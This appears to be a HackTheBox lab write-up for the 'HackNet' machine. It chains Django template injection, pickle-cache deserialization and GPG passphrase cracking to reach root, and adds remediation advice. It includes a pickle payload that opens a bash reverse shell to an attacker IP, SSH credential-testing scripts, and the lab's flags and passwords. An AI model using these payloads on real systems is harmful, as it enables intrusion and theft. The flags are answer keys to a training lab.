# HackNet - HackTheBox Machine Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Status](https://img.shields.io/badge/Status-Pwned-success)

## Machine Overview

**Name:** HackNet  
**IP:** 10.129.232.4  
**Difficulty:** Medium  
**OS:** Linux (Debian)  
**Points:** 30

## Quick Summary

HackNet is a medium-difficulty Linux machine featuring a Django social networking application. The machine demonstrates real-world vulnerabilities including Server-Side Template Injection (SSTI), insecure pickle deserialization, and weak cryptographic practices.

### Attack Path
```
SSTI (Username Field) → Credential Extraction → SSH Access (mikey)
                                                      ↓
                                            Enumerate Django App
                                                      ↓
                                          Pickle Deserialization RCE
                                                      ↓
                                            Code Execution (www-data)
                                                      ↓
                                            Extract GPG Private Key
                                                      ↓
                                              Crack GPG Passphrase
                                                      ↓
                                            Decrypt Database Backup
                                                      ↓
                                         Find MySQL Root Password
                                                      ↓
                                              ROOT ACCESS (su)
```

## Flags

- **User Flag:** `b2e0413c7f9daf1f3008edc3c0d1ffdd`
- **Root Flag:** `132d03b6361e83f2b6e0670ec88ad1b4`

## Key Credentials

| User | Password | Service | Access |
|------|----------|---------|--------|
| mikey | mYd4rks1dEisH3re | SSH | User |
| sandy | h@ckn3tDBpa$$ | MySQL | Database |
| sandy | sweetheart | GPG | Private Key |
| root | h4ck3rs4re3veRywh3re99 | System | Root |

## Repository Structure

```
HackNet-HTB/
│
├── README.md                      # This file
├── WALKTHROUGH.md                 # Detailed step-by-step guide
│
├── scripts/
│   ├── extract_credentials.py     # Django SSTI credential extraction
│   ├── test_ssh_credentials.py    # SSH credential validation tool
│   ├── django_rce.py              # Django cache pickle RCE exploit
│   ├── django_find_gpg.py         # GPG key enumeration via RCE
│   └── django_copy_gpg.py         # GPG key extraction via RCE
│
├── outputs/
│   ├── nmap_scan.txt              # Nmap scan results
│   ├── ffuf.txt                   # Directory fuzzing results
│   ├── credentials.json           # Extracted user credentials
│   ├── credentials.txt            # Credentials in readable format
│   └── ssh_valid_credentials.txt  # Valid SSH credentials
│
└── notes.txt                      # Detailed pentesting notes
```

## Vulnerabilities Exploited

### 1. Django Server-Side Template Injection (SSTI)
**CVE:** N/A (Application-specific)  
**CVSS:** 8.6 (High)

**Description:**  
The Django application renders user-controlled input (username) in templates without proper escaping. By setting username to `{{ users.values }}`, an attacker can inject template code that gets executed server-side, leaking all user credentials from the database.

**Impact:**
- Information disclosure (all user credentials)
- Potential remote code execution
- Authentication bypass

**PoC:**
```python
# Change username to:
{{ users.values }}

# Like posts to trigger template rendering
# View /likes/{post_id} to see leaked data
```

**Remediation:**
```python
# Always escape user input in templates
from django.utils.html import escape
safe_username = escape(user_input)

# Or use Django's autoescape
{{ username|escape }}
```

---

### 2. Pickle Deserialization RCE
**CVE:** N/A (Configuration issue)  
**CVSS:** 9.8 (Critical)

**Description:**  
Django's file-based cache uses Python's `pickle` module for serialization. The cache directory `/var/tmp/django_cache` has world-writable permissions (777), allowing attackers to inject malicious pickle payloads. When Django deserializes the cache, arbitrary code is executed.

**Impact:**
- Remote code execution as www-data
- Complete application compromise
- Access to sensitive files

**PoC:**
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/10.10.15.180/4444 0>&1'",))

payload = pickle.dumps(RCE())
# Write to /var/tmp/django_cache/*.djcache
```

**Remediation:**
```python
# Don't use pickle for untrusted data
# Use Redis or Memcached instead
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.redis.RedisCache',
        'LOCATION': 'redis://127.0.0.1:6379/1',
    }
}

# Fix directory permissions
sudo chmod 700 /var/tmp/django_cache
sudo chown www-data:www-data /var/tmp/django_cache
```

---

### 3. Weak GPG Passphrase
**CVE:** N/A (Weak configuration)  
**CVSS:** 6.5 (Medium)

**Description:**  
The GPG private key for user `sandy` is protected with the weak passphrase "sweetheart", which appears in the rockyou.txt wordlist. The private key file was accessible to the www-data group, allowing extraction via the RCE vulnerability.

**Impact:**
- Decryption of sensitive backup files
- Disclosure of MySQL credentials
- Lateral movement to database administrator

**PoC:**
```bash
# Extract hash
gpg2john armored_key.asc > hash.txt

# Crack with john
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Result: sweetheart (cracked in 3 seconds)
```

**Remediation:**
```bash
# Generate strong passphrase
pwgen -s 32 1

# Or use diceware
diceware -n 8

# Protect private keys
chmod 600 ~/.gnupg/private-keys-v1.d/*
chmod 700 ~/.gnupg
```

---

### 4. Sensitive Data in Backups
**CVE:** N/A (Poor security practice)  
**CVSS:** 7.5 (High)

**Description:**  
Database backups contain plaintext passwords in the messages table, including the MySQL root password. The backups were encrypted with GPG but used a weak passphrase. The MySQL root password was reused for the system root account.

**Impact:**
- Exposure of database credentials
- Password reuse leading to privilege escalation
- Full system compromise

**Evidence:**
```sql
-- From backup02.sql
INSERT INTO `SocialNetwork_socialmessage` VALUES
(50,'2024-12-29 20:30:41.806921','Here''s the password: h4ck3rs4re3veRywh3re99',1,18,22);
```

**Remediation:**
```bash
# Exclude sensitive tables from backups
mysqldump --ignore-table=hacknet.messages > backup.sql

# Don't store credentials in application database
# Use environment variables or secret management tools

# Never reuse passwords between services
# MySQL root password ≠ System root password

# Encrypt backups with strong passphrases
# Implement proper key management
```

---

## Tools Used

### Reconnaissance
- **nmap** - Port scanning and service enumeration
- **whatweb** - Web technology fingerprinting
- **ffuf** - Directory and file fuzzing
- **curl** - HTTP request testing

### Exploitation
- **Custom Python Scripts** - SSTI exploitation and automation
- **netcat** - Reverse shell listener
- **ssh** - Remote access

### Post-Exploitation
- **gpg2john** - GPG hash extraction
- **john** - Password cracking
- **gpg** - File decryption
- **mysql** - Database access

## Attack Timeline

| Step | Time | Action | Result |
|------|------|--------|--------|
| 1 | 0:00 | Nmap scan | Found SSH and HTTP |
| 2 | 0:05 | Web enumeration | Django social network |
| 3 | 0:15 | SSTI testing | Found template injection |
| 4 | 0:20 | Credential extraction | 26 user credentials |
| 5 | 0:25 | SSH brute force | Found mikey credentials |
| 6 | 0:30 | User access | User flag obtained |
| 7 | 0:35 | Django enumeration | Found cache directory |
| 8 | 0:45 | Pickle RCE exploit | Code execution as www-data |
| 9 | 0:50 | GPG key extraction | Got sandy's private key |
| 10 | 1:00 | Passphrase cracking | Cracked "sweetheart" |
| 11 | 1:05 | Backup decryption | Found MySQL password |
| 12 | 1:10 | Root access | Root flag obtained |

**Total Time:** ~70 minutes

## Lessons Learned

### For Developers

1. **Input Validation**
   - Always sanitize user input before rendering in templates
   - Use Django's built-in escaping mechanisms
   - Implement Content Security Policy (CSP)

2. **Serialization Security**
   - Never use pickle with untrusted data
   - Use JSON or MessagePack for caching
   - Implement cache signing/encryption

3. **File Permissions**
   - Follow principle of least privilege
   - Never use 777 permissions
   - Audit file permissions regularly

4. **Cryptography**
   - Use strong, random passphrases (20+ characters)
   - Implement proper key management
   - Regularly rotate encryption keys

5. **Data Protection**
   - Don't store sensitive data unnecessarily
   - Exclude sensitive tables from backups
   - Encrypt data at rest
   - Use separate credentials for each service

### For Penetration Testers

1. **Automation**
   - Write scripts to automate repetitive tasks
   - Build reusable tools for common vulnerabilities
   - Document your methodology

2. **Enumeration**
   - Always check configuration files
   - Look for world-writable directories
   - Enumerate all user-accessible data

3. **Persistence**
   - Complex chains require multiple exploitation steps
   - Keep detailed notes of your progress
   - Don't give up when one path fails

4. **Creativity**
   - Think outside the box (pickle RCE via cache)
   - Chain multiple low-severity issues
   - Explore unconventional attack vectors

## Scripts Documentation

### extract_credentials.py

**Purpose:** Automate extraction of user credentials via Django SSTI vulnerability.

**Requirements:**
```bash
pip3 install requests beautifulsoup4
```

**Configuration:**
```python
TARGET_URL = "http://hacknet.htb"
CSRF_TOKEN = "YOUR_CSRF_TOKEN"
SESSION_ID = "YOUR_SESSION_ID"
POST_START = 1
POST_END = 30
```

**Usage:**
```bash
python3 extract_credentials.py
```

**Output:**
- `credentials.json` - Machine-readable format
- `credentials.txt` - Human-readable format

**How It Works:**
1. Likes posts 1-30 to trigger username rendering
2. Fetches `/likes/{post_id}` for each post
3. Parses HTML to extract data from `img title` attributes
4. Extracts email and password using regex
5. Deduplicates and saves results

---

### test_ssh_credentials.py

**Purpose:** Test extracted credentials against SSH service using multi-threading.

**Requirements:**
```bash
pip3 install paramiko
```

**Configuration:**
```python
TARGET_HOST = "10.129.232.4"
TARGET_PORT = 22
CREDENTIALS_FILE = "credentials.json"
MAX_THREADS = 5
```

**Usage:**
```bash
python3 test_ssh_credentials.py
```

**Output:**
- Console: Real-time testing results
- `ssh_valid_credentials.txt` - Valid credentials only

**How It Works:**
1. Loads credentials from JSON file
2. Creates thread pool (5 workers)
3. Tests each credential in parallel
4. On success: Executes `whoami; id; hostname`
5. Reports results with color coding
6. Saves valid credentials to file

---

### django_rce.py

**Purpose:** Exploit Django cache pickle deserialization for remote code execution.

**Requirements:** None (standard Python libraries)

**Configuration:**
```python
CACHE_DIR = "/var/tmp/django_cache"
LHOST = "10.10.15.180"  # Your VPN IP
LPORT = "4444"
```

**Usage:**
```bash
# Transfer to target
scp django_rce.py mikey@10.129.232.4:/tmp/

# Execute on target
ssh mikey@10.129.232.4
python3 /tmp/django_rce.py

# On attacking machine
nc -lvnp 4444

# Trigger by visiting /explore
curl http://hacknet.htb/explore
```

**How It Works:**
1. Creates malicious pickle payload with `__reduce__()`
2. Payload executes: `os.system(reverse_shell_command)`
3. Removes existing cache files
4. Writes pickle payload to all `.djcache` files
5. When Django loads cache: Code execution!

---

## References

- [Django Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [Pickle Security](https://docs.python.org/3/library/pickle.html#restricting-globals)
- [Django Cache Framework](https://docs.djangoproject.com/en/stable/topics/cache/)
- [GPG Best Practices](https://riseup.net/en/security/message-security/openpgp/best-practices)

## Credits

**Author:** [Your Name]  
**Date:** December 2025  
**Platform:** HackTheBox  
**Difficulty:** Medium

## Disclaimer

This writeup is for educational purposes only. The techniques described should only be used in authorized penetration testing engagements or on systems you own. Unauthorized access to computer systems is illegal.

---

**Happy Hacking! 🎉**
